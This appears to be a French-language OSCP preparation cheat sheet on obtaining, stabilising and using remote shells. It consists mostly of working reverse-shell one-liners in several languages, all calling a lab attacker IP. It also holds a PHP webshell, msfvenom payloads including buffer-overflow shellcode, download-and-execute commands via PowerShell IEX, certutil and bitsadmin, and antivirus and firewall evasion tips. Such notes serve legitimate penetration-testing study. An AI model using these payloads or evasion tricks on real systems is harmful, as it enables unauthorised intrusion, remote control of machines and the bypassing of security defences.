# 06 — Shells & Payloads

Notes de préparation OSCP. Objectif : obtenir un shell, le stabiliser, le maintenir, et pivoter proprement. Toutes les commandes sont à adapter à l'IP de l'attaquant (`$LHOST`) et au port d'écoute (`$LPORT`).

Liens : [[01-Methodologie-Reseau]] · [[02-Windows-Privesc]] · [[03-Linux-Privesc]] · [[07-Exam-Checklist]]

---

## 1. Concepts de base

### Bind shell vs Reverse shell

- **Bind shell** : la cible ouvre un port et attend une connexion. L'attaquant se connecte à la cible. Utile si l'attaquant est derrière un NAT et que la cible est directement joignable. Souvent bloqué par les firewalls entrants.
- **Reverse shell** : la cible se connecte à l'attaquant qui écoute. C'est le cas le plus fréquent en pratique car le trafic sortant est plus permissif que l'entrant.

Règle mnémotechnique : "reverse" = la cible revient vers toi.

### Interactive vs non-interactive

Un shell obtenu via exécution de commande (webshell, RCE one-shot) est souvent non-interactif : pas de `sudo`, pas de `vim`, pas de complétion, pas de Ctrl-C sans tuer la session. La stabilisation TTY est prioritaire dès qu'on a un shell (voir §4).

### Staged vs Stageless (Metasploit)

- **Stageless** (`_reverse_tcp` sans stager) : payload complet en un seul bloc. Plus gros, mais fiable.
- **Staged** (`/reverse_tcp` avec stager) : un petit loader télécharge le reste. Plus petit à injecter mais nécessite handler compatible (`exploit/multi/handler` avec le bon payload).

Convention msfvenom : `windows/shell/reverse_tcp` = staged, `windows/shell_reverse_tcp` = stageless. Le `_` avant `reverse` change tout.

---

## 2. Listeners côté attaquant

### Netcat

```bash
nc -lvnp 4444
```

- `-l` listen, `-v` verbose, `-n` pas de DNS, `-p` port.
- Sous Kali, `nc` est souvent `ncat` (OpenBSD ou nmap). `ncat --ssl -lvnp 4444` pour du TLS.

### rlwrap (readline autour de nc)

```bash
rlwrap nc -lvnp 4444
```

Donne les flèches haut/bas et l'historique dès la connexion, avant même la stabilisation TTY. À utiliser par défaut.

### pwncat-cs

```bash
pwncat-cs -lp 4444
```

Auto-stabilisation, gestion de sessions, upload/download intégrés, escalade suggérée. Très pratique pour l'exam mais rester capable de faire à la main.

### Metasploit multi/handler

```
use exploit/multi/handler
set PAYLOAD <même payload que dans msfvenom>
set LHOST <ip>
set LPORT <port>
set ExitOnSession false
run -j
```

`run -j` en background pour recevoir plusieurs sessions.

---

## 3. Payloads reverse shell par langage

Écouter avec `nc -lvnp 4444` puis exécuter côté cible.

### Bash

```bash
bash -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

Alternative sans `/dev/tcp` (utile si compilé sans) :

```bash
exec 5<>/dev/tcp/10.10.14.5/4444; cat <&5 | while read line; do $line 2>&5 >&5; done
```

### sh (POSIX, plus portable)

```bash
sh -i >& /dev/tcp/10.10.14.5/4444 0>&1
```

### Python

```bash
python3 -c 'import socket,subprocess,os,pty;s=socket.socket();s.connect(("10.10.14.5",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
```

Cette variante intègre déjà `pty.spawn`, ce qui économise une étape de stabilisation.

### PHP

```php
php -r '$sock=fsockopen("10.10.14.5",4444);exec("/bin/sh -i <&3 >&3 2>&3");'
```

Version webshell (fichier `.php` déposé) :

```php
<?php system($_GET["c"]); ?>
```

Puis `curl "http://cible/shell.php?c=bash+-i+>%26+/dev/tcp/10.10.14.5/4444+0>%261"`.

### Perl

```perl
perl -e 'use Socket;$i="10.10.14.5";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
```

### Ruby

```ruby
ruby -rsocket -e 'exit if fork;c=TCPSocket.new("10.10.14.5","4444");while(cmd=c.gets);IO.popen(cmd,"r"){|io|c.print io.read}end'
```

### Netcat

```bash
nc -e /bin/bash 10.10.14.5 4444           # si -e est supporté
mkfifo /tmp/f; nc 10.10.14.5 4444 </tmp/f | /bin/sh >/tmp/f 2>&1; rm /tmp/f   # sans -e
```

### PowerShell (Windows)

Nishang / one-liner classique :

```powershell
$client = New-Object System.Net.Sockets.TCPClient("10.10.14.5",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbytes = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbytes,0,$sendbytes.Length);$stream.Flush()};$client.Close()
```

Encodage en base64 pour éviter les problèmes de quoting (à passer à `powershell.exe -e`) :

```bash
echo -n '<script>' | iconv -t UTF-16LE | base64 -w 0
```

### cmd.exe (rarement direct, plutôt via un binaire)

Utiliser `nc.exe` transféré sur la cible :

```
nc.exe -e cmd.exe 10.10.14.5 4444
```

---

## 4. Stabilisation du TTY (Linux)

Étape critique. Sans TTY correct, `su`, `sudo`, `vim`, Ctrl-C, `less` cassent la session.

### Méthode standard (Python + stty)

Dans le shell obtenu :

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
# ou python -c '...' si python3 absent
```

Puis :

```bash
export TERM=xterm
export SHELL=bash
```

Backgrounder le shell avec Ctrl-Z (sur ta machine Kali), puis :

```bash
stty raw -echo; fg
```

(taper la commande "à l'aveugle", elle ne s'affiche pas). Enter deux fois. Ensuite définir la taille du terminal pour éviter les affichages tronqués :

```bash
stty size          # sur Kali, pour connaître rows/cols
stty rows 50 columns 200   # dans le shell distant
```

### Alternative script

```bash
script -qc /bin/bash /dev/null
```

### Alternative socat (à faire depuis Kali si `socat` dispo sur la cible)

Listener Kali :

```bash
socat file:`tty`,raw,echo=0 tcp-listen:4444
```

Cible :

```bash
socat tcp-connect:10.10.14.5:4444 exec:"bash -li",pty,stderr,setsid,sigint,sane
```

Donne un TTY complet dès la connexion. À privilégier si `socat` est présent.

### Windows

Pas de vrai TTY sur les shells classiques. Options :
- `ConPtyShell` (Invoke-ConPtyShell) donne un pseudo-TTY complet.
- Sinon, viser Meterpreter ou passer par `evil-winrm` si WinRM ouvert.

---

## 5. MSFvenom — génération de payloads

Format général :

```bash
msfvenom -p <payload> LHOST=<ip> LPORT=<port> -f <format> -o <fichier>
```

### Payloads utiles à connaître par cœur

**Linux x64 reverse shell ELF :**
```bash
msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f elf -o shell.elf
```

**Windows reverse shell EXE (x64) :**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f exe -o shell.exe
```

**Windows Meterpreter reverse HTTPS (bypass firewall) :**
```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=10.10.14.5 LPORT=443 -f exe -o met.exe
```

**PHP webshell reverse :**
```bash
msfvenom -p php/reverse_php LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.php
# ajouter <?php au début si absent
```

**ASPX (IIS) :**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f aspx -o shell.aspx
```

**JSP (Tomcat) :**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f raw -o shell.jsp
```

**WAR (déployable Tomcat) :**
```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f war -o shell.war
```

**Shellcode C (pour buffer overflow) :**
```bash
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.5 LPORT=4444 -f c -b "\x00\x0a\x0d" EXITFUNC=thread
```

- `-b` : bad characters à éviter.
- `EXITFUNC=thread` : évite de crasher le processus vulnérable.

### Options fréquentes

- `-e x86/shikata_ga_nai -i 10` : encodeur (10 itérations). Ne trompe plus les AV modernes seul, à combiner.
- `-a x86` / `-a x64` : architecture.
- `--platform windows|linux`.
- `-f exe-service` : payload EXE de service Windows (utile pour PSExec-style).

### Rappel handler assorti

Toujours démarrer le `multi/handler` avec exactement le même PAYLOAD que celui généré. Un `windows/shell_reverse_tcp` (stageless) ne se connecte pas à un handler configuré sur `windows/shell/reverse_tcp` (staged).

---

## 6. Transfert de fichiers vers la cible

### Serveur HTTP côté Kali

```bash
python3 -m http.server 80
# ou avec upload : uploadserver, updog
```

### Récupération côté Linux

```bash
wget http://10.10.14.5/linpeas.sh -O /tmp/lp.sh
curl -o /tmp/lp.sh http://10.10.14.5/linpeas.sh
```

### Récupération côté Windows

```powershell
# PowerShell
IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.5/PowerUp.ps1')
(New-Object Net.WebClient).DownloadFile('http://10.10.14.5/nc.exe','C:\Windows\Temp\nc.exe')

# PowerShell 3+
Invoke-WebRequest -Uri http://10.10.14.5/nc.exe -OutFile C:\Windows\Temp\nc.exe

# certutil (LOLBAS)
certutil -urlcache -f http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe

# bitsadmin
bitsadmin /transfer job /download /priority normal http://10.10.14.5/nc.exe C:\Windows\Temp\nc.exe
```

### SMB serveur (utile quand HTTP filtré)

```bash
# Kali
impacket-smbserver share . -smb2support
# ou avec auth : impacket-smbserver share . -smb2support -user u -password p
```

Cible Windows :
```
copy \\10.10.14.5\share\nc.exe C:\Windows\Temp\
```

### Base64 (petit fichier, aucun outil)

Kali :
```bash
base64 -w0 payload.bin > payload.b64
```

Cible Linux :
```bash
echo '<base64>' | base64 -d > payload.bin
```

Cible Windows :
```powershell
[IO.File]::WriteAllBytes("C:\Windows\Temp\payload.bin",[Convert]::FromBase64String("<base64>"))
```

---

## 7. Ports et évasion firewall

Ordre à essayer si les ports "exotiques" sont bloqués :
1. `443` (HTTPS) — presque toujours autorisé en sortie.
2. `80` (HTTP).
3. `53` (DNS) — parfois filtré à L7 mais souvent OK en TCP.
4. `8080`, `4444`, ports hauts.

Utiliser `reverse_https` en Meterpreter pour ressembler à du trafic web légitime.

---

## 8. Encodage & obfuscation minimale

Pas d'AV bypass avancé au programme OSCP, mais quelques réflexes :

- **PowerShell encoded command** : `-EncodedCommand` avec base64 UTF-16LE. Contourne les problèmes de quoting et une partie du logging naïf.
- **AMSI bypass** (à connaître, snippets classiques dispo) : à tester si Defender bloque un script.
- **Renommer les binaires** : `nc.exe` → `svchost-update.exe` évite certaines détections signature-based nom-only.
- **Éviter les EXE générés bruts par msfvenom** sur cible avec Defender à jour : préférer meterpreter HTTPS ou un loader compilé maison.

---

## 9. Cheatsheet ultra-condensée

| Besoin | Commande |
|---|---|
| Listener basique | `rlwrap nc -lvnp 4444` |
| Reverse bash | `bash -i >& /dev/tcp/IP/PORT 0>&1` |
| Stabiliser TTY (1) | `python3 -c 'import pty;pty.spawn("/bin/bash")'` |
| Stabiliser TTY (2) | Ctrl-Z, `stty raw -echo; fg`, Enter x2 |
| Meterpreter Win x64 | `msfvenom -p windows/x64/meterpreter/reverse_https ... -f exe` |
| Reverse Linux ELF | `msfvenom -p linux/x64/shell_reverse_tcp ... -f elf` |
| Webshell PHP | `<?php system($_GET["c"]); ?>` |
| Download Win | `certutil -urlcache -f http://IP/f.exe out.exe` |
| Serveur HTTP Kali | `python3 -m http.server 80` |
| SMB Kali | `impacket-smbserver share . -smb2support` |

---

## 10. Erreurs classiques à éviter

- Oublier `-n` sur `nc` : DNS lookup qui retarde ou révèle des infos.
- Payload staged vs stageless incohérent entre msfvenom et handler.
- Ne pas encoder les caractères spéciaux dans un webshell (`&` → `%26`, espace → `+`).
- Utiliser `python` au lieu de `python3` sur cible qui n'a que python2 (ou l'inverse). Vérifier `which python python3`.
- Oublier de `chmod +x` un binaire téléchargé sous Linux.
- Ne pas régler `stty rows/cols` après stabilisation : `less`/`vim` cassent.
- Lancer un shell reverse depuis un contexte où `bash` n'existe pas (Alpine, embedded) : utiliser `sh`.
- Fermer le listener trop tôt entre deux payloads. Toujours relancer avant de tirer.
- Sur exam : ne pas documenter la commande exacte utilisée. Copier immédiatement dans les notes après chaque shell.

---

## Références rapides

- PayloadsAllTheThings — Methodology and Resources / Reverse Shell Cheatsheet.
- GTFOBins pour la partie post-shell Linux.
- LOLBAS pour Windows.
- HighOn.Coffee reverse shell cheatsheet.
